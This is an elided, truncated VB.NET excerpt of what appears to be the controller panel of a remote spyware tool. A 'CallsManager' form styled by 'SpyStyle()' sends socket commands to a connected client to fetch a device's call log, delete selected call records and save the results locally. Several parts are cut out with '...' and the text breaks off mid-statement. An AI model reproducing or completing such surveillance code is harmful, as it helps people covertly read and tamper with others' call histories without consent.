Public Class CallsManager
    ...
    Private Sub CallsManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Icon = New Icon(reso.res_Path & "\Icons\win\5.ico")
         SpyStyle()
    ...
    End Sub
        ...
        If DGV0.SelectedRows.Count > 0 Then
             For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                 ...
                 If Not classClient Is Nothing Then
                     Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".calls" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "del" & sockets.Data.SPL_DATA & key, Codes.Encoding().GetBytes("null"), classClient}
     ...
     Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        If Not classClient Is Nothing Then
             Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".calls" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getCalls & sockets.Data.SPL_SOCKET & "calls", Codes.Encoding().GetBytes("null"), classClient}
             classClient.SendAsync(objs)
         End If
    End Sub
     ...
     Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        ...
        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, tmpFolderUSER, "Calls Manager",
